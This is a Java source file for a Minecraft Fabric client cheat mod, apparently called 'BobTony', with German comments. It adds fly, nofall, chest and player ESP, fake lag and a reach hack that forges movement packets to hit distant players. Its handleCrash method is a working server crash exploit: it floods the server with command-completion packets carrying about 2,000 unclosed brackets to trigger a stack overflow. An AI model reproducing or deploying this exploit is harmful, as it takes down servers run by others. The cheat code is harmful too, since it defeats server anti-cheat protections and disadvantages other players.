package dev.onyxx.bobtony.client;

import com.mojang.blaze3d.systems.RenderSystem;
import com.mojang.brigadier.arguments.IntegerArgumentType;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.suggestion.SuggestionProvider;
import dev.einfachyannik.bobtony.utils.gui.Color;
import dev.einfachyannik.bobtony.utils.render.Render3D;
import dev.einfachyannik.bobtony.enums.Modes;
import dev.einfachyannik.bobtony.utils.render.WorldToScreen;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback;
import net.fabricmc.fabric.api.client.rendering.v1.WorldRenderEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.block.*;
import net.minecraft.block.entity.*;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.render.*;
import net.minecraft.client.util.InputUtil;
import net.minecraft.client.network.ClientPlayerEntity;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.network.packet.PacketType;
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayNetworkHandler;
import net.minecraft.text.Text;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.EntityHitResult;
import net.minecraft.util.math.*;
import net.minecraft.world.World;
import net.minecraft.world.chunk.WorldChunk;
import org.lwjgl.glfw.GLFW;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.stream.Stream;

public class BobTony_OneBitcoin {
    // Keybindings
    private final KeyBinding toggleModeKey; // Keybinding to switch modes (double jump or key)

    // FINAL VARIABLES
    public static final String PREFIX = "§8[§6BobTony§8] §r";

    //State variables
    private List<String> trackerList = new ArrayList();
    private long lastUpdateTime = System.currentTimeMillis(); // Last time movement was simulated
    private long lastJumpTime = 0; // Timestamp of the last jump
    private boolean wasJumping = false; // Tracks if the jump key was previously pressed
    private long lastModeSwitchTime = 0; // Last mode switch timestamp
    private static final long MODE_SWITCH_COOLDOWN = 1000; // Cooldown time for mode switching in ms
    public static float flyspeed = 0.1f; // Default flight speed
    public static float strength = 2.0f;
    public static float speed = 1.0f;
    public static boolean nofall = false;
    public static Modes mode = Modes.NONE; //Mode
    public static boolean chestesp = false;
    public static boolean fly = false;
    private static final Logger LOGGER = LoggerFactory.getLogger("PacketLoggerClient");
    public static boolean fakeLag = false;
    public static int fakeLagDelay = 350;
    public static boolean reachHack = false;

    public BobTony_OneBitcoin() {
        toggleModeKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
                "Switch modes", // Keybinding name
                InputUtil.Type.KEYSYM,
                GLFW.GLFW_KEY_M, // Default key (M)
                "BobTony Mod LOL" // Category
        ));

        // Register client tick event handler
        ClientTickEvents.END_CLIENT_TICK.register(client -> {
            if (client.player == null) return;

            ClientPlayerEntity player = client.player;

            // Handle mode switching
            handleModeSwitch(player);

            // Handle doubleJump
            handleDoubleJump(player);

            // nofall
            if (nofall && client.player != null && !client.player.getAbilities().flying) {
                client.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                        client.player.getX(),
                        client.player.getY(),
                        client.player.getZ(),
                        true,
                        true
                ));

                // Wenn ich immernoch damage in der Luft nehme dann geh ich crashout
                client.player.fallDistance = 0.0f;
            }

            // Reach
            if (client.options.attackKey.isPressed() && reachHack) {
                attackWithReach(player, 100.0);
            }

        });

        ClientSendMessageEvents.ALLOW_CHAT.register(message -> {
            if (message.startsWith(".strength ")){
                handleStrengthCommand(message);
                return false;
            }else if (message.equals(".nofall")) {
                handelNoFallCommand();
                return false; //Cancel die Message für den Server halt (ich geh crashout, fick dich IntelliJ)
            } else if (message.startsWith(".flyspeed ")) {
                handelFlySpeedCommand(message);
                return false;
            } else if (message.startsWith(".attack ")) {
                attackCommand(message);
                return false;
            } else if (message.startsWith(".speed ")) {
                handleSpeedCommand(message);
                return false;
            } else if (message.startsWith(".tracker ")) {
                handleTracker(message);
                return false;
            } else if (message.equals(".chestesp")) {
                handleChestESP();
                return false;
            } else if (message.equals(".fly")){
                handleFly();
                return false;
            } else if (message.startsWith(".crash ")){
                handleCrash(message);
                return false;
            } else if (message.equals(".fakelag")){
                fakeLag = !fakeLag;
                return false;
            } else if (message.startsWith(".delay ")){
                handeFakeLag(message);
                return false;
            } else if (message.equals(".reach")){
                reachHack = !reachHack;
                return false;
            }

            return true; //Maybe ein forceMessage also das mutes nichts mehr bringen
        });

        WorldRenderEvents.AFTER_ENTITIES.register(context -> {
            MinecraftClient client = MinecraftClient.getInstance();
            MatrixStack matrices = context.matrixStack();
            Camera camera = client.gameRenderer.getCamera();
            Vec3d cameraPos = client.gameRenderer.getCamera().getPos();
            World world = client.world;
            VertexConsumerProvider.Immediate vertexConsumerProvider = (VertexConsumerProvider.Immediate) context.consumers();

            float tickDelta = context.tickCounter().getTickDelta(false);
            Color color = new Color(255, 0, 0, 1.0F);


            for (Entity entity : client.world.getEntities()) {
                if (trackerList != null) {
                    for (String name : trackerList) {
                        if (Objects.equals(entity.getName(), Text.literal(name))) {
                            Render3D.drawLineToEntity(matrices, client.player, entity, tickDelta, color, 2.0f);
                            if (entity != client.player) {
                                double interpolatedX = entity.prevX + (entity.getX() - entity.prevX) * tickDelta;
                                double interpolatedY = entity.prevY + (entity.getY() - entity.prevY) * tickDelta;
                                double interpolatedZ = entity.prevZ + (entity.getZ() - entity.prevZ) * tickDelta;

                                Box box = entity.getBoundingBox().offset(
                                        interpolatedX - entity.getX() - cameraPos.x,
                                        interpolatedY - entity.getY() - cameraPos.y,
                                        interpolatedZ - entity.getZ() - cameraPos.z
                                );

                                DrawContext drawContext = new DrawContext(client, vertexConsumerProvider);

                                //Render3D.drawBox(matrices, vertexConsumer.getBuffer(RenderLayer.LINES), box.minX, box.minY, box.minZ, box.maxX, box.maxY, box.maxZ, red, green, blue, alpha, red, green, blue);
                                Render3D.draw3DHitBox(matrices, box, color, 2.0F);

                            }
                        }
                    }
                }
            }

            if (chestesp){
                getTileEntities().forEach(blockEntity ->
                {
                    Box box = new Box(
                            blockEntity.getPos().getX() - cameraPos.x,
                            blockEntity.getPos().getY() - cameraPos.y,
                            blockEntity.getPos().getZ() - cameraPos.z,
                            blockEntity.getPos().getX() + 1 - cameraPos.x,
                            blockEntity.getPos().getY() + 1 - cameraPos.y,
                            blockEntity.getPos().getZ() + 1 - cameraPos.z
                    );
                    if (blockEntity instanceof ChestBlockEntity || blockEntity instanceof TrappedChestBlockEntity) {
                        Color blockColor = new Color(0, 255, 0, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    }else if (blockEntity instanceof BarrelBlockEntity){
                        Color blockColor = new Color(0, 0, 255, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    }else if (blockEntity instanceof FurnaceBlockEntity){
                        Color blockColor = new Color(255, 0, 0, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    }else if (blockEntity instanceof ShulkerBoxBlockEntity){
                        Color blockColor = new Color(255, 100, 0, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    }else if (blockEntity instanceof BeaconBlockEntity){
                        Color blockColor = new Color(0, 255, 255, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    }else if (blockEntity instanceof DropperBlockEntity){
                        Color blockColor = new Color(255, 255, 0, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    } else if (blockEntity instanceof DispenserBlockEntity) {
                        Color blockColor = new Color(255, 255, 255, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    } else if (blockEntity instanceof EnderChestBlockEntity){
                        Color blockColor = new Color(255, 0, 255, 1.0F);
                        Render3D.draw3DBox(matrices, box, blockColor, 2.0F);
                        Render3D.drawLineToBlockEntity(matrices, client.player, blockEntity, tickDelta, blockColor, 2.0f);
                        RenderSystem.setShaderColor(1.0F, 1.0F, 1.0F, 1.0F);
                    }

                });


            }

        });

        HudRenderCallback.EVENT.register(((drawContext, tickCounter) -> {
            MinecraftClient client = MinecraftClient.getInstance();
            for (Entity entity : client.world.getEntities()) {
                if (trackerList != null) {
                    for (String name : trackerList) {
                        if (Objects.equals(entity.getName(), Text.literal(name))) {
                            java.awt.Color color = new java.awt.Color(255, 255, 255);
                            float delta = tickCounter.getTickDelta(false);

                            int screenW = client.getWindow().getScaledWidth(), screenH = client.getWindow().getScaledHeight();

                            float yaw = client.player.getYaw();
                            float pitch = client.player.getPitch();

                            String distance = String.valueOf(entity.distanceTo(client.player));

                            Vec3d namePos = new Vec3d(entity.getX(), entity.getY() + 2.5, entity.getZ());
                            Vec3d distancePos = new Vec3d(entity.getX(), entity.getY() + 2.2, entity.getZ());

                            Vec3d screenPos = WorldToScreen.worldSpaceToScreenSpace(namePos);
                            Vec3d screenPosDistance = WorldToScreen.worldSpaceToScreenSpace(distancePos);

                            if (screenPos != null) {

                                if (WorldToScreen.screenSpaceCoordinateIsVisible(screenPos)) {
                                    drawContext.drawText(client.textRenderer, name, (int) screenPos.x, (int) screenPos.y, color.getRGB(), false);
                                    drawContext.drawText(client.textRenderer, distance, (int) screenPosDistance.x, (int) screenPosDistance.y, color.getRGB(), false);
                                }
                            }
                        }
                    }
                }
            }
        }));
    }

    private void handeFakeLag(String message){

        MinecraftClient client = MinecraftClient.getInstance();
        String[] parts = message.split(" ");
        if (parts.length == 2) {
            try {
                fakeLagDelay = Integer.parseInt(parts[1]);
                client.player.sendMessage(Text.literal(PREFIX + "Delay: §c" + fakeLagDelay), false);
            } catch (NumberFormatException e) {
                client.player.sendMessage(Text.literal(PREFIX + "§cKeine richtige Zahl!"), false);
            }
        } else {
            client.player.sendMessage(Text.literal(PREFIX + "§cUsage: .delay <value>"), false);
        }
    }

    private void handleCrash(String message){

        String[] parts = message.split(" ");

        int packets = Integer.parseInt(parts[1]);

        // Made it smaller under 2048, but it still cannot throw stackoverflow every time.
        String overflow = generateJsonObject(2032);

        // Latest server builds can kick if partialCommand length is greater than 2048,
        // probably can be compressed even more.
        String partialCommand = message.replace("{PAYLOAD}", overflow);
        for (int i = 0; i < packets; i++) {
            MinecraftClient.getInstance().getNetworkHandler().sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }

    }

    private String generateJsonObject(int levels) {
        // Brigadier does not check for closing brackets
        // Until it is too late.

        // Replaced Object with array and removed closing brackets
        String in = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());
        return "{a:" + in + "}";
    }

    private void handleFly(){
        MinecraftClient client = MinecraftClient.getInstance();

        if (mode != Modes.FLY){
            mode = Modes.FLY;
            client.player.sendMessage(Text.literal(PREFIX + "Fly: §aOn"), false);
        }else {
            mode = Modes.NONE;
            client.player.sendMessage(Text.literal(PREFIX + "Fly: §cOff"), false);
        }
    }

    private void handleChestESP(){
        MinecraftClient client = MinecraftClient.getInstance();
        chestesp = !chestesp;
        if (chestesp){
            client.player.sendMessage(Text.literal(PREFIX + "ChestESP: §aOn"), false);
        }else {
            client.player.sendMessage(Text.literal(PREFIX + "ChestESP: §cOff"), false);
        }
    }

    private void handleTracker(String message){
        MinecraftClient client = MinecraftClient.getInstance();

        String[] parts = message.split(" ");
        if (parts.length == 3) {
            if (parts[1].equals("add")){
                trackerList.add(parts[2]);
                client.player.sendMessage(Text.literal(PREFIX + "§aAdded " + parts[2] + " to Trackerlist: " + trackerList), false);
            }else if (parts[1].equals("remove")){
                trackerList.remove(parts[2]);
            }
        } else {
            client.player.sendMessage(Text.literal(PREFIX + "§cUsage: .tracker <add|remove> <player_name>"), false);
        }
    }

    public static Stream<BlockEntity> getTileEntities() {
        return getLoadedChunks().flatMap(chunk -> chunk.getBlockEntities().values().stream());
    }

    public static Stream<WorldChunk> getLoadedChunks() {
        int radius = Math.max(2, MinecraftClient.getInstance().options.getClampedViewDistance()) + 3;
        int diameter = radius * 2 + 1;

        ChunkPos center = MinecraftClient.getInstance().player.getChunkPos();
        ChunkPos min = new ChunkPos(center.x - radius, center.z - radius);
        ChunkPos max = new ChunkPos(center.x + radius, center.z + radius);

        Stream<WorldChunk> stream = Stream.<ChunkPos>iterate(min, pos -> {
            int x = pos.x;
            int z = pos.z;
            x++;

            if (x > max.x) {
                x = min.x;
                z++;
            }

            return new ChunkPos(x, z);

        }).limit((long) diameter * diameter).filter(c -> MinecraftClient.getInstance().world.isChunkLoaded(c.x, c.z)).map(c -> MinecraftClient.getInstance().world.getChunk(c.x, c.z)).filter(Objects::nonNull);

        return stream;
    }

    private void handleSpeedCommand(String message){
        MinecraftClient client = MinecraftClient.getInstance();

        String[] parts = message.split(" ");
        if (parts.length == 2) {
            try {
                speed = Float.parseFloat(parts[1]);
                client.player.setMovementSpeed(0.3f);
                client.player.sendMessage(Text.literal(PREFIX + "Speed: §c" + client.player.getMovementSpeed()), false);
            } catch (NumberFormatException e) {
                client.player.sendMessage(Text.literal(PREFIX + "§cKeine richtige Zahl!"), false);
            }
        } else {
            client.player.sendMessage(Text.literal(PREFIX + "§cUsage: .speed <value>"), false);
        }
    }

    private void handleStrengthCommand(String message) {
        MinecraftClient client = MinecraftClient.getInstance();
        // Alles nach dem command
        String[] parts = message.split(" ");
        if (parts.length == 2) {
            try {
                strength = Float.parseFloat(parts[1]);
                client.player.sendMessage(Text.literal(PREFIX + "Boost Strength: §c" + strength), false);
            } catch (NumberFormatException e) {
                client.player.sendMessage(Text.literal(PREFIX + "§cKeine richtige Zahl!"), false);
            }
        } else {
            client.player.sendMessage(Text.literal(PREFIX + "§cUsage: .strength <value>"), false);
        }
    }

    private void handelNoFallCommand(){
        MinecraftClient client = MinecraftClient.getInstance();
        nofall = !nofall;
        if (nofall){
            client.player.sendMessage(Text.literal(PREFIX + "NoFall: §aOn"), false);
        }else {
            client.player.sendMessage(Text.literal(PREFIX + "NoFall: §cOff"), false);
        }
    }

    private void handelFlySpeedCommand(String message){
        MinecraftClient client = MinecraftClient.getInstance();
        // Alles nach dem command
        String[] parts = message.split(" ");
        if (parts.length == 2) {
            try {
                adjustFlySpeed(client.player, Float.parseFloat(parts[1]));
                client.player.sendMessage(Text.literal(PREFIX + "Flyspeed: §c" + flyspeed), false);
            } catch (NumberFormatException e) {
                client.player.sendMessage(Text.literal(PREFIX + "§cKeine richtige Zahl!"), false);
            }
        } else {
            client.player.sendMessage(Text.literal(PREFIX + "§cUsage: .strength <value>"), false);
        }
    }

    private void attackCommand(String message){

        MinecraftClient client = MinecraftClient.getInstance();
        MinecraftServer server = client.getServer();

        String[] parts = message.split(" ");

        if (parts.length == 2){
            if (server != null) {
                server.getOverworld().getPlayers().forEach(player -> {
                    if (player.getName().equals(parts[1])){
                        for (int i = 0; i < 20; i++){
                            PlayerInteractEntityC2SPacket attackPacket = PlayerInteractEntityC2SPacket.attack(player, client.player.isSneaking());
                            client.player.networkHandler.sendPacket(attackPacket);
                            client.player.swingHand(Hand.MAIN_HAND);
                        }
                    }
                });
            }
        }



    }

    // Handles switching between double jump and keybinding modes
    private void handleModeSwitch(ClientPlayerEntity player) {
        long currentTime = System.currentTimeMillis();
        if (toggleModeKey.isPressed() && currentTime - lastModeSwitchTime > MODE_SWITCH_COOLDOWN) {
            if (mode == Modes.FLY){
                mode = Modes.BOOST;
                player.sendMessage(Text.of(PREFIX +" Fly: §cOff"), false);
                player.sendMessage(Text.of(PREFIX +" Boost: §aOn"), false);
            }else {
                mode = Modes.FLY;
                player.sendMessage(Text.of(PREFIX +" Boost: §cOff"), false);
                player.sendMessage(Text.of(PREFIX +" Fly: §aOn"), false);
            }

            lastModeSwitchTime = currentTime; // Update mode switch timestamp
        }
    }

    // Adjusts the flight speed by the specified amount
    private void adjustFlySpeed(ClientPlayerEntity player, float amount) {
        flyspeed = amount;
        player.getAbilities().setFlySpeed(flyspeed);
        player.sendAbilitiesUpdate();
    }

    // Handles flight activation using the double space mode
    private void handleDoubleJump(ClientPlayerEntity player) {
        boolean isJumping = player.input.playerInput.jump(); // Check if jump key is pressed

        if (isJumping && !wasJumping) {
            long currentTime = System.currentTimeMillis();
            if (currentTime - lastJumpTime < 300) { // Double jump detected
                if(mode == Modes.FLY) {
                    toggleFlyMode(player);
                }else if(mode == Modes.BOOST) {
                    boostPlayer(player);
                }
            }
            lastJumpTime = currentTime;
        }

        wasJumping = isJumping;
    }

    //Boost Player
    private void boostPlayer(ClientPlayerEntity apfel) {
        double pitch = apfel.getPitch();
        Vec3d velocity;

        if (pitch > 70) {
            velocity = new Vec3d(0.0, 1.0, 0.0).multiply(strength);
        } else {
            velocity = apfel.getRotationVector().multiply(strength);
        }

        apfel.addVelocity(velocity.x, velocity.y + 0.5, velocity.z);
        apfel.velocityModified = true;
    }

    // Toggles the flight mode for the player
    private void toggleFlyMode(ClientPlayerEntity player) {
        boolean isFlying = !player.getAbilities().flying; // Toggle flight state
        player.getAbilities().flying = isFlying;
        player.getAbilities().setFlySpeed(flyspeed); // Set current flyspeed

        if (isFlying) {
            player.sendMessage(Text.of("Fly: §aEnabled"), true);
            //simulateMovement(player); // Start or manage movement simulation
        } else {
            player.sendMessage(Text.of("Fly: §cDisabled"), true);
        }

        player.sendAbilitiesUpdate(); // Sync abilities with the server
    }

    // Simulates slight movements to prevent being kicked for inactivity while flying
    private void simulateMovement(ClientPlayerEntity player) {
        new Thread(() -> {
            try {
                boolean wasSneaking = player.input.playerInput.sneak(); // Sneak-Status initialisieren
                boolean wasTouchingCeiling = false; // Status für Deckenberührung
                while (player.getAbilities().flying) {
                    boolean isSneaking = player.input.playerInput.sneak();

                    // Bewegung simulieren, wenn nicht sneakt und keine Decke berührt wird
                    if (!isSneaking) {
                        long currentTime = System.currentTimeMillis();
                        if (currentTime - lastUpdateTime > 50) {
                            // Simuliere leichte Bewegungen
                            player.networkHandler.sendPacket(
                                    new PlayerMoveC2SPacket.PositionAndOnGround(
                                            player.getX(), player.getY() + 0.05, player.getZ(), true, false
                                    )
                            );
                            player.networkHandler.sendPacket(
                                    new PlayerMoveC2SPacket.PositionAndOnGround(
                                            player.getX(), player.getY(), player.getZ(), true, false
                                    )
                            );
                            lastUpdateTime = currentTime;
                        }
                    }

                    // Aktualisiere den vorherigen Zustand
                    wasSneaking = isSneaking;

                    Thread.sleep(50); // 20 Ticks pro Sekunde simulieren
                }
            } catch (InterruptedException ignored) {
            }
        }).start();
    }

    public static EntityHitResult getReachTarget(ClientPlayerEntity player, double range) {
        Vec3d startPos = player.getCameraPosVec(1.0f);
        Vec3d lookVec = player.getRotationVec(1.0f);
        Vec3d endPos = startPos.add(lookVec.multiply(range));

        Box box = player.getBoundingBox().expand(range);
        List<Entity> entities = player.getWorld().getOtherEntities(player, box);

        EntityHitResult closestEntity = null;
        double closestDistance = range;

        for (Entity entity : entities) {
            Box entityBox = entity.getBoundingBox().expand(0.1);
            Vec3d hitResult = entityBox.raycast(startPos, endPos).orElse(null);

            if (hitResult != null) {
                double distance = startPos.distanceTo(hitResult);
                if (distance < closestDistance) {
                    closestEntity = new EntityHitResult(entity);
                    closestDistance = distance;
                }
            }
        }

        return closestEntity;
    }

    public static void attackWithReach(ClientPlayerEntity player, double range) {
        EntityHitResult target = getReachTarget(player, range);

        if (target != null) {
            Entity entity = target.getEntity();

            double oldX = player.getX();
            double oldY = player.getY();
            double oldZ = player.getZ();

            Vec3d oldPos = new Vec3d(player.getX(), player.getY(), player.getZ());

            PlayerMoveC2SPacket resetPacket = new PlayerMoveC2SPacket.PositionAndOnGround(
                    oldPos.getX(),
                    oldPos.getY(),
                    oldPos.getZ(),
                    player.groundCollision,
                    player.horizontalCollision
            );

            PlayerMoveC2SPacket movePacket = new PlayerMoveC2SPacket.PositionAndOnGround(
                    target.getEntity().getX(),
                    target.getEntity().getY(),
                    target.getEntity().getZ(),
                    player.groundCollision,
                    player.horizontalCollision
            );

            PlayerInteractEntityC2SPacket attackPacket = PlayerInteractEntityC2SPacket.attack(entity, player.isSneaking());
            player.networkHandler.sendPacket(movePacket);
            System.out.println(new Vec3d(target.getEntity().getX(), target.getEntity().getY(), target.getEntity().getZ()));
            player.networkHandler.sendPacket(attackPacket);
            player.networkHandler.sendPacket(resetPacket);
            System.out.println(new Vec3d(oldPos.getX(), oldPos.getY(), oldPos.getZ()));

            player.swingHand(player.getActiveHand());
        }
    }

}





